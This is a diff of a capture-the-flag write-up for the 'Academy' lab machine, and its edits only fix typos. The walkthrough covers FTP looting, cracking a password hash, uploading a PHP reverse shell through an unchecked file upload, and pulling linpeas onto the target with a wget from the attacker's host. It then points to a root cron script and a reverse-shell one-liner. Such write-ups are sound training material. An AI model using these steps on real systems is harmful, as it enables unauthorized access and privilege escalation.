@@ -13,9 +13,9 @@ We go ahead to check out what ftp has for us. For that we use <ftp IP> and then 
 ![image](https://github.com/Bangis041/academy-/assets/74382096/d07f7c83-9256-4046-a6b6-6cf56a21cb1e)
 
 
-Here we downloaded the note.txt file using <get file-name> and then I viewed it on my attaker's machine. From the note.txt, we found out Grimmie was was a user and dev who uses same passwords everwhere hehe😂 and we also found a SQL database where we saw the student RegNo, passwords and all other things that can be used to login. It was also from 2020 and the message ws from jdelta.
+Here we downloaded the note.txt file using <get file-name> and then I viewed it on my attacker's machine. From the note.txt, we found out Grimmie was a user and dev who uses same passwords everwhere hehe😂 and we also found a SQL database where we saw the student RegNo, passwords and all other things that can be used to login. It was also from 2020 and the message was from jdelta.
 
-After that we check outh the next port that might matter to us. SSH is not it so we move down to port 80.
+After that we check out the next port that might matter to us. SSH is not it so we move down to port 80.
 Just paste the IP on your browser and check round for any useful information. After loading the website, there was no much information. we only knew what technology was behind it.
 ![image](https://github.com/Bangis041/academy-/assets/74382096/53b38ac7-4519-4202-90c5-ca4b81d25de3)
 Here we proceed to using a directory buster. I will be using gobuster in this instance. SYNTAX: <gobuster dir -u http://IP -w wordlist_file/path>.
@@ -25,7 +25,7 @@ Afer scanning we were able to get two directories. One interests me more and tha
  so i looked at the password again and realized it was not a password but a hash. Most students used weak passwords😂. I simply used https://crackstation.net to crack the password and it was "student" so i logged in and said to myself "I'm IN !!!" hehe.
 ![image](https://github.com/Bangis041/academy-/assets/74382096/64a793e0-cdc9-4e1b-8199-4617a0b93152)
 
-Nothing was looking intersting here, just the 'My Profile' page. I uploaded a photo there and it went successful and then i tried to upload a file that was neither .jpg or .png format and it went. I smiled and said to myself, I am in that mode already with one kind of evil smile on my face. The plan here was to create a reverse shell and see if we can gain access. I simply go to google and search for php reverse shell. It bring out one pentestmonkey githb, i moved in there and saw a sweet code i can work with. i copied the entire code and used nano to create a .php file. I named it shell.php. SYNTAX: <nano <file_name>.php>. Read the code and change what needs to be changed, upload and listen. Once agai guys.... I'm in!!!. I tried running <sudo -l> to check if i gain root access, it gave an error. So then i realised i needed to use an automation tool i learnt about on https://tryhackme.com/r/room/linprivesc. Simply go to google and search 'linpeas'. I found the script, ![image](https://github.com/Bangis041/academy-/assets/74382096/2437bec1-dff5-49ae-9557-dd9d001422cb)
+Nothing was looking interesting here, just the 'My Profile' page. I uploaded a photo there and it went successful and then i tried to upload a file that was neither .jpg or .png format and it went. I smiled and said to myself, I am in that mode already with one kind of evil smile on my face. The plan here was to create a reverse shell and see if we can gain access. I simply go to google and search for php reverse shell. It bring out one pentestmonkey githb, i moved in there and saw a sweet code i can work with. i copied the entire code and used nano to create a .php file. I named it shell.php. SYNTAX: <nano <file_name>.php>. Read the code and change what needs to be changed, upload and listen. Once again guys.... I'm in!!!. I tried running <sudo -l> to check if i gain root access, it gave an error. So then i realised i needed to use an automation tool i learnt about on https://tryhackme.com/r/room/linprivesc. Simply go to google and search 'linpeas'. I found the script, ![image](https://github.com/Bangis041/academy-/assets/74382096/2437bec1-dff5-49ae-9557-dd9d001422cb)
 i copied and pasted in a .sh file i named linpeas. Now i have to transfer the file to the shell by hosting a webserver ad using wget. since I am transferrig from my machine to the target's mahine, i use <wget http://MY_IP/file> ![image](https://github.com/Bangis041/academy-/assets/74382096/040247fa-141e-4d1f-ab19-828aaee7d1f8). Now is time to change the permission to make it executable and then run!!!. 
 ![image](https://github.com/Bangis041/academy-/assets/74382096/269bb845-d796-4154-81b7-ddd10c3906ee)
 We were given what to look out for also...made work easier. While scrolling through, I was able to get this...* * * * * /home/grimmie/backup.sh and also this 👇
@@ -34,7 +34,7 @@ We were given what to look out for also...made work easier. While scrolling thro
 Now it's looking like it's a dead end after trying sudo -l. I checked the content of backupsh and realised it supposed to run at some point. Crontabs did not work so i used ps aux to list processes and we can see it is running as root user. Maybe we are correct.
 ![image](https://github.com/Bangis041/academy-/assets/74382096/94de302c-2c28-410a-b51c-a7f04ad8f0ee). 
 
-From hree, we head over to google.com as it is out best friend to ask it asbout "bash reverse shell one liner" and we see a link on pentestmonkey. 
+From here, we head over to google.com as it is out best friend to ask it asbout "bash reverse shell one liner" and we see a link on pentestmonkey. 
 ![image](https://github.com/Bangis041/academy-/assets/74382096/319e4683-a49a-43a1-82a7-01a53a3994f6)
 
 We get a command to use to get a shell...Let's try it and see what comes.
